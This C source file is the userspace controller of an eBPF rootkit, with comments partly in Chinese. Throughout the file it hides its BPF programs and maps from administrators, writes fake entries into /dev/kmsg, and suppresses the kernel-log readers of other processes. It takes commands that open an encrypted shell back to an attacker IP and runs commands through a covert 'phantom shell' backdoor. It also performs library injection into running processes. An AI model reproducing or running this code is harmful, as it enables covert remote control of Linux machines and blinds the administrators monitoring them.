#define _GNU_SOURCE
#include <argp.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <linux/if_link.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <locale.h>
#include <dlfcn.h>
#include <link.h>
#include <stdlib.h>      // 提供 atoi
#include <dirent.h>      // 提供 DIR, opendir, readdir, DT_DIR
#include <bpf/bpf.h>


#include "../common/constants.h"
#include "../common/map_common.h"
#include "../common/c&c.h"
#include "../common/struct_common.h"
#include "include/modules/module_manager.h"
#include "include/utils/network/ssl_client.h"
#include "include/utils/mem/injection.h"

#include "kit.skel.h"
#define ABORT_IF_ERR(err, msg)\
	if(err<0){\
		fprintf(stderr, msg);\
		goto cleanup\
	}

int FD_TC_MAP;
__u32 ifindex; //Interface to which the rootkit connects
char* local_ip;

static struct env {
	bool verbose;
} env;

int check_map_fd_info(int map_fd, struct bpf_map_info *info, struct bpf_map_info *exp){
	__u32 info_len = sizeof(*info);
	int err;

	if (map_fd < 0)
		return -1;

	err = bpf_obj_get_info_by_fd(map_fd, info, &info_len);
	if (err) {
		fprintf(stderr, "ERR: %s() can't get info - %s\n",
			__func__,  strerror(errno));
		return -1;
	}

	if (exp->key_size && exp->key_size != info->key_size) {
		fprintf(stderr, "ERR: %s() "
			"Map key size(%d) mismatch expected size(%d)\n",
			__func__, info->key_size, exp->key_size);
		return -1;
	}
	if (exp->value_size && exp->value_size != info->value_size) {
		fprintf(stderr, "ERR: %s() "
			"Map value size(%d) mismatch expected size(%d)\n",
			__func__, info->value_size, exp->value_size);
		return -1;
	}
	if (exp->max_entries && exp->max_entries != info->max_entries) {
		fprintf(stderr, "ERR: %s() "
			"Map max_entries(%d) mismatch expected size(%d)\n",
			__func__, info->max_entries, exp->max_entries);
		return -1;
	}
	if (exp->type && exp->type  != info->type) {
		fprintf(stderr, "ERR: %s() "
			"Map type(%d) mismatch expected type(%d)\n",
			__func__, info->type, exp->type);
		return -1;
	}

	return 0;
}

void print_help_dialog(const char* arg){
	
    printf("\nUsage: %s ./kit OPTION\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-t[NETWORK INTERFACE]";
    char* desc = "Activate XDP filter";
    printf("\t%-40s %-50s\n\n", line, desc);
	line = "-v";
    desc = "Verbose mode";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-h";
    desc = "Print this help";
    printf("\t%-40s %-50s\n\n", line, desc);

}

/*Wrapper for printing into stderr when debug active*/
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args){
	if (level == LIBBPF_DEBUG && !env.verbose)
		return 0;
	return vfprintf(stderr, format, args);
}

/**
* Increases kernel internal memory limit
* necessary to allocate resouces like BPF maps.
*/
static void bump_memlock_rlimit(void){
	struct rlimit rlim_new = {
		.rlim_cur	= RLIM_INFINITY,
		.rlim_max	= RLIM_INFINITY,
	};

	if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
		fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit!\n");
		exit(1);
	}
}

static volatile bool exiting = false;

static void sig_handler(int sig){
	exiting = true;
}

//自隐藏初始化代码
//修改后的自隐藏初始化代码（仅处理 Map 和 Prog ID）
static int setup_self_hiding(struct kit_bpf *skel) {
    __u32 err;
    __u32 hide_val = 0xFFFFFFFF; 

    // 1. 程序 ID 隐藏
    struct bpf_program *prog;
    bpf_object__for_each_program(prog, skel->obj) {
        struct bpf_prog_info info = {};
        __u32 info_len = sizeof(info);
        int fd = bpf_program__fd(prog);
        
        err = bpf_obj_get_info_by_fd(fd, &info, &info_len);
        if (err == 0) {
            bpf_map_update_elem(bpf_map__fd(skel->maps.bpf_programs), &info.id, &hide_val, BPF_ANY);
        }
    }

    // 2. Map ID 隐藏
    struct bpf_map *map;
    bpf_object__for_each_map(map, skel->obj) {
        struct bpf_map_info info = {};
        __u32 info_len = sizeof(info);
        int fd = bpf_map__fd(map);

        err = bpf_obj_get_info_by_fd(fd, &info, &info_len);
        if (err == 0) {
            bpf_map_update_elem(bpf_map__fd(skel->maps.bpf_maps), &info.id, &hide_val, BPF_ANY);
        }
    }
	__u32 sentinel = 0xFFFFFFFF;
    __u32 key_prog = 0; // 对应程序的哨兵位
    __u32 key_map = 1;  // 对应 Map 的哨兵位
    
    int next_id_fd = bpf_map__fd(skel->maps.bpf_next_id);
    
    
    bpf_map_update_elem(next_id_fd, &key_prog, &sentinel, BPF_ANY);
    bpf_map_update_elem(next_id_fd, &key_map, &sentinel, BPF_ANY);
    return 0;
}

/**
 * 采集并初始化假日志剧本
 * 返回 0 表示成功，-1 表示关键 Map 无法访问
 */
static int setup_kmsg_theater(struct kit_bpf *skel) {
    // 1. 获取 Map 的文件描述符
    int map_fd = bpf_map__fd(skel->maps.fa_kmsgs);
    if (map_fd < 0) {
        fprintf(stderr, "[-] Error: Failed to get fa_kmsgs map FD\n");
        return -1;
    }

    // 2. 尝试打开真实的 kmsg 获取信息
    FILE *fp = fopen("/dev/kmsg", "r");
    char line[256];
    __u32 key = 0;
    
    printf("[+] Loading kmsg theater scripts...\n");

    if (fp) {
        // 读取真实的系统日志，挑选看起来“官方”的存入 Map
        // 注意：此时我们还没挂钩 read，所以读到的是真实数据
        while (fgets(line, sizeof(line), fp) && key < FAKE_KMSG_COUNT) {
            // 过滤：挑选无害的系统级日志
            if (strstr(line, "systemd") || strstr(line, "eth0") || 
                strstr(line, "PCI") || strstr(line, "USB") || strstr(line, "acpi")) {
                
                struct kmsg_data_t data = {0};
                
                // 跳过 kmsg 消息前缀（格式如 "6,123,456,-;"）
                char *msg_content = strchr(line, ';');
                if (msg_content) {
                    msg_content++; // 移至分号后的内容
                } else {
                    msg_content = line;
                }

                data.len = strlen(msg_content);
                // 限制长度，防止溢出缓冲区
                unsigned int copy_len = data.len < (sizeof(data.content)) ? 
                                       data.len : (sizeof(data.content) - 1);
                
                memcpy(data.content, msg_content, copy_len);
                // 确保字符串以 null 结尾
                data.content[copy_len] = '\0';

                if (bpf_map_update_elem(map_fd, &key, &data, BPF_ANY) != 0) {
                    break;
                }
                key++;
            }
        }
        fclose(fp);
    }

    // 3. 兜底逻辑：如果系统日志太少，用预设的“万金油”填满剩余槽位
    const char *backup_logs[] = {
        "systemd[1]: Reached target Multi-User System.\n",
        "systemd[1]: Reached target Graphical Interface.\n",
        "systemd[1]: Finished Initialize default Netplan configuration.\n",
        "systemd[1]: Started Network Time Service.\n",
        "systemd[1]: Started Dispatcher daemon for systemd-networkd.\n"
    };

    int backup_count = sizeof(backup_logs) / sizeof(backup_logs[0]);
    while (key < FAKE_KMSG_COUNT) {
        struct kmsg_data_t data = {0};
        const char *msg = backup_logs[key % backup_count];
        
        data.len = strlen(msg);
        memcpy(data.content, msg, data.len);
        
        bpf_map_update_elem(map_fd, &key, &data, BPF_ANY);
        key++;
    }

    printf("[+] Theater ready: %u logs active.\n", key);
    return 0;
}

/**
 * 遍历 /proc 查找所有打开了 /dev/kmsg 的进程 FD
 */
static int block_existing_kmsg_fds(struct kit_bpf *skel) {
    DIR *proc = opendir("/proc");
    if (!proc) return -1;

    struct dirent *entry;
    int blocked_count = 0;
    int fd_map = bpf_map__fd(skel->maps.kmsg_fds);

    while ((entry = readdir(proc))) {
        if (entry->d_type != DT_DIR) continue;
        
        int pid = atoi(entry->d_name);
        if (pid <= 0 || pid == getpid()) continue; // 跳过非法 PID 和 Rootkit 自身

        // 1. 读取进程名称 (comm)
        char comm_path[256], comm[32] = {0};
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *comm_f = fopen(comm_path, "r");
        
        if (comm_f) {
            if (fgets(comm, sizeof(comm), comm_f)) {
                // 去掉末尾换行符
                comm[strcspn(comm, "\n")] = 0;
            }
            fclose(comm_f);

            // --- 核心优化：白名单过滤 ---
            // 如果是 Hyper-V 同步组件或系统日志核心服务，绝不阻塞
            if (strstr(comm, "hv_") || strstr(comm, "vmbus") || 
                strstr(comm, "udevd") || strstr(comm, "systemd-journal")) {
                continue; 
            }
        }

        // 2. 检查该进程的 FD 列表
        char fd_dir_path[256];
        snprintf(fd_dir_path, sizeof(fd_dir_path), "/proc/%d/fd", pid);
        DIR *fd_dir = opendir(fd_dir_path);
        if (!fd_dir) continue;

        struct dirent *fd_entry;
        while ((fd_entry = readdir(fd_dir))) {
            if (fd_entry->d_name[0] == '.') continue;

            char link_path[512], real_path[512];
            snprintf(link_path, sizeof(link_path), "%s/%s", fd_dir_path, fd_entry->d_name);
            
            ssize_t len = readlink(link_path, real_path, sizeof(real_path) - 1);
            if (len != -1) {
                real_path[len] = '\0';
                // 只拦截指向 /dev/kmsg 的文件描述符
                if (strcmp(real_path, "/dev/kmsg") == 0) {
					__u32 fd_num = (__u32)atoi(fd_entry->d_name);
					// 构造复合键：(PID << 32) | FD
					__u64 compound_key = ((__u64)pid << 32) | fd_num;
					__u32 mark = 1;
					bpf_map_update_elem(fd_map, &compound_key, &mark, BPF_ANY);
					blocked_count++;
				}
            }
        }
        closedir(fd_dir);
    }
    closedir(proc);
    printf("[+] Precised blocking complete. %d FDs suppressed.\n", blocked_count);
    return blocked_count;
}


static void flush_kmsg_buffer() {
    FILE *f = fopen("/dev/kmsg", "w");
    if (f) {
        // 这一条消息会成为“引信”，触发所有读取进程的篡改逻辑
        fprintf(f, "systemd[1]: Resync Network Time Service.\n");
        fclose(f);
        printf("[+] Kmsg buffer flushed with fake heartbeat.\n");
    }
}


/**
 * @brief Manages an event received via the ring buffer
 * It's a message from th ebpf program
 * 
 * @param ctx 
 * @param data 
 * @param data_sz 
 * @return int 
 */
static int handle_rb_event(void *ctx, void *data, size_t data_size){
	const struct rb_event *e = data;

	//For time displaying
	struct tm *tm;
	char ts[32];
	int ret;
	time_t t;
	time(&t);
	tm = localtime(&t);
	strftime(ts, sizeof(ts), "%H:%M:%S", tm);

	//Before parsing any data, check the type
    if(e->event_type == INFO){
		printf("%s INFO  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
	}else if(e->event_type == DEBUG){

	}else if(e->event_type == ERROR){

	}else if(e->event_type == EXIT){

	}else if(e->event_type == COMMAND){
		printf("%s COMMAND  pid:%d code:%i\n", ts, e->pid, e->code);
		char attacker_ip[INET_ADDRSTRLEN];
		switch(e->code){
			case CC_PROT_COMMAND_ENCRYPTED_SHELL:
			//TODO EXTRACT IP FROM KERNEL BUFFER
				inet_ntop(AF_INET, &e->client_ip, attacker_ip, INET_ADDRSTRLEN);
				printf("Starting encrypted connection with ip: %s\n", attacker_ip);
				client_run(attacker_ip, 8500);
            	break;
			case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
				printf("Activating all hooks as requested\n");
				activate_all_modules_config();
				ret = unhook_all_modules();
				if(ret<0) printf("Failed to complete command: unhook all\n");
				ret = setup_all_modules();
				if(ret<0) printf("Failed to complete command: setup modules\n");
            	break;
			case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
				printf("Deactivating all hooks as requested\n");
				deactivate_all_modules_config();
				ret = unhook_all_modules();
				if(ret<0) printf("Failed to complete command: unhook all\n");
            	break;
			default:
				printf("Command received unknown: %d\n", e->code);
		}
	}else if(e->event_type == PSH_UPDATE){
		printf("Requested to update the phantom shell\n");
		__u64 key = 1;
		struct backdoor_phantom_shell_data data;
		struct bpf_map_info map_expect = {0};
		struct bpf_map_info info = {0};
		FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
		map_expect.key_size    = sizeof(__u64);
		map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
		map_expect.max_entries = 1;
		int err = check_map_fd_info(FD_TC_MAP, &info, &map_expect);
		printf("TC MAP ID: %d\n", FD_TC_MAP);
		if (err) {
			fprintf(stderr, "ERR: map via FD not compatible\n");
			return err;
		}
		printf("Collected stats from BPF map:\n");
		printf(" - BPF map (bpf_map_type:%d) id:%d name:%s"
			" key_size:%d value_size:%d max_entries:%d\n",
			info.type, info.id, info.name,
			info.key_size, info.value_size, info.max_entries
			);
		err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
		if(err<0) {
			printf("Failed to read the shared map: %d\n", err);
			//return -1;
		}
		printf("Pre value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
		data.active = e->bps_data.active;
		data.d_ip = e->bps_data.d_ip;
		data.d_port = e->bps_data.d_port;
		if(strncmp(e->bps_data.payload, CC_PROT_PHANTOM_SHELL_INIT, strlen(CC_PROT_PHANTOM_SHELL_INIT))!=0){
			//Means that we invoked the command with another payload, thus this is not the first call
			//We are tasked with first trying to execute the command
			printf("Executing requested command: \n%s\n", e->bps_data.payload);
			char *p;
			char* buf = calloc(4096, sizeof(char));
			strcpy(buf, e->bps_data.payload);
			p = strtok((char*)buf, "#");
			p = strtok(NULL, "#");
			if (p) {
				//printf("Executing command: %s\n", p);
				char *res = execute_command((char*)p);
				char *response = calloc(4096, sizeof(char));
				if(res==NULL){
					strcpy(response, CC_PROT_ERR);
				}else{
					strcpy(response, CC_PROT_PHANTOM_COMMAND_RESPONSE);
					strcat(response, res);
				}
				//printf("Answering to phantom shell: \n%s\n", response);
				memcpy(data.payload, response, 64);
				free(response);
				free(buf);
				printf("Post value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
				bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
				return 0;

			}else{
				printf("Failed to parse command\n");
				return -1;
			}
		}
		//Init connection with phantom shell
		memcpy(data.payload, e->bps_data.payload, 64);
		printf("Post value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
		bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
	}else if(e->event_type == VULN_SYSCALL){
		//eBPF detected syscall which can lead to library injection
		printf("%s VULN_SYSCALL  pid:%d syscall:%llx, return:%llx, libc_main:%llx, libc_dlopen_mode:%llx, libc_malloc:%llx, got:%llx, relro:%i\n", ts, e->pid, e->syscall_address, e->process_stack_return_address, e->libc_main_address, e->libc_dlopen_mode_address, e->libc_malloc_address, e->got_address, e->relro_active);
		if(manage_injection(e)<0){
			printf("Library injection failed\n");
		}
	}else{
		printf("%s COMMAND  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
		return -1;
	}

	return 0;
}

int main(int argc, char**argv){
    struct ring_buffer *rb = NULL;
    struct kit_bpf *skel;
	struct bpf_map_info map_expect = {0};
	struct bpf_map_info info = {0};
    __u32 err;
	bool hide_myself=false; //控制自隐藏
	/* Parse command line arguments */
	int opt;
	while ((opt = getopt(argc, argv, ":t:vhH")) != -1) {
        switch (opt) {
        case 't':
            ifindex = if_nametoindex(optarg);
            printf("Activating filter on network interface: %s\n", optarg);
            if(ifindex == 0){
				perror("Error on input interface");
				exit(EXIT_FAILURE);
			}
			int fd = socket(AF_INET, SOCK_DGRAM, 0);
			struct ifreq ifr;
			//Type of address to retrieve - IPv4 IP address
			ifr.ifr_addr.sa_family = AF_INET;
			//Copy the interface name in the ifreq structure
			strncpy(ifr.ifr_name , optarg , IFNAMSIZ-1);
			ioctl(fd, SIOCGIFADDR, &ifr);
			close(fd);
			local_ip = inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);
			printf("%s - %s\n" , optarg , local_ip );
			break;
		case 'v':
			//Verbose output
			env.verbose = true;
			break;

        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("Unknown option: %c\n", optopt);
			exit(EXIT_FAILURE);
            break;
        case ':':
            printf("Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        case 'H':
			hide_myself = true;
			break;
        default:
            print_help_dialog(argv[0]);
            exit(EXIT_FAILURE);
        }
    }
	
	//Set up libbpf errors and debug info callback
	libbpf_set_print(libbpf_print_fn);

	// Bump RLIMIT_MEMLOCK to be able to create BPF maps
	bump_memlock_rlimit();

	//Cleaner handling of Ctrl-C
	signal(SIGINT, sig_handler);
	signal(SIGTERM, sig_handler);

    //Open and create BPF application in the kernel
	skel = kit_bpf__open();
	if (!skel) {
		fprintf(stderr, "Failed to open and load BPF skeleton\n");
		return 1;
	}
	// --- 移植点 A: 此时 Skeleton 已打开但未加载，可以设置全局变量 ---
    skel->rodata->TARGET_PID = getpid();
	
	
	//Load & verify BPF program
	err = kit_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}
	// 在程序真正挂载（Attach）前，执行注销动作
    // 此时内核已经分配了 ID，但管理员还没来得及看
	if(hide_myself){
		    err = setup_self_hiding(skel);
			if (err) {
				fprintf(stderr, "Failed to setup self-hiding\n");
			}
			err = setup_kmsg_theater(skel);
			if (err < 0) {
				printf("[-] Warning: Kmsg theater initialization failed, but continuing...\n");
			}
			block_existing_kmsg_fds(skel);
	}

	FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
	printf("TC MAP ID: %d\n", FD_TC_MAP);
	map_expect.key_size    = sizeof(__u64);
	map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
	map_expect.max_entries = 1;
	err = check_map_fd_info(FD_TC_MAP, &info, &map_expect);
	if (err) {
		fprintf(stderr, "ERR: map via FD not compatible. Is the TC hook open?\n");
		return err;
	}
	printf("Collected stats from BPF map:\n");
	printf(" - BPF map (bpf_map_type:%d) id:%d name:%s"
			" key_size:%d value_size:%d max_entries:%d\n",
			info.type, info.id, info.name,
			info.key_size, info.value_size, info.max_entries
			);
	__u64 key = 1;
	struct backdoor_phantom_shell_data data;
	err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
	if(err<0) {
		printf("Failed to lookup element\n");
		return -1;
	}
	printf("Value: %i, %i, %i\n", data.active, data.d_ip, data.d_port);
	bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);

	/*bpf_obj_get(NULL);
	char* DIRECTORY_PIN = "/sys/fs/bpf/mymaps";
	err = bpf_object__unpin_maps(skel->obj, DIRECTORY_PIN);
	if (err) {
		fprintf(stderr, "ERR: UNpinning maps in %s\n",DIRECTORY_PIN);
		//return -1;
	}
	err = bpf_object__pin_maps(skel->obj, DIRECTORY_PIN);
	if (err) {
		fprintf(stderr, "ERR: pinning maps in %s\n",DIRECTORY_PIN);
		return -1;
	}
	bpf_map__pin(skel->maps.backdoor_phantom_shell, DIRECTORY_PIN);*/

	//Attach XDP and sched modules using module manager
	//and setup the parameters for the installation
	//XDP
	module_config.xdp_module.all = ON;
	module_config_attr.xdp_module.flags = XDP_FLAGS_REPLACE;
	module_config_attr.xdp_module.ifindex = ifindex;
	//SCHED
	module_config.sched_module.all = ON;
	//FS
	module_config.fs_module.all = ON;

	//INJECTION
	module_config.injection_module.all = ON;
	
	module_config_attr.skel = skel;
	err = setup_all_modules();
	if(err!=0){
		perror("ERROR setting up the rootkit hooks");
	}
	flush_kmsg_buffer();
	// Set up ring buffer polling --> Main communication buffer kernel->user
	rb = ring_buffer__new(bpf_map__fd(skel->maps.rb_comm), handle_rb_event, NULL, NULL);
	if (rb==NULL) {
		err = -1;
		fprintf(stderr, "Failed to create ring buffer\n");
		goto cleanup;
	}

	struct link_map *lm;
	off_t offset = 0;
	unsigned long long dlopenAddr;
    lm = dlopen("libc.so.6", RTLD_LAZY);
	if(lm==0){
		perror("Error obtaining libc symbols");
		return -1;
	}
    dlopenAddr = (unsigned long long)dlsym((void*)lm, "__libc_dlopen_mode");
    printf("libdl: %lx\n", lm->l_addr);
	printf("dlopen: %llx\n", dlopenAddr);
	offset = dlopenAddr - lm->l_addr;
	printf("Offset: %lx\n", offset);

	//Once we have the offset of libc we proceed to uprobe our target program


	//Now wait for messages from ebpf program
	printf("Filter set and ready\n");
	while (!exiting) {
		err = ring_buffer__poll(rb, 100 /* timeout, ms */);
		
		//Checking if a signal occured
		if (err == -EINTR) {
			err = 0;
			break;
		}
		if (err < 0) {
			printf("Error polling ring buffer: %d\n", err);
			break;
		}
	}

	//Received signal to stop, detach program from network interface
	/*err = detach_sched_all(skel);
	if(err<0){
		perror("ERR");
		goto cleanup;
	}
	detach_xdp_all(skel);
	if(err<0){
		perror("ERR");
		goto cleanup;
	}*/

cleanup:
	ring_buffer__free(rb);
	//kit_bpf__destroy(skel);
	if(err!=0) return -1;

    return 0;
}
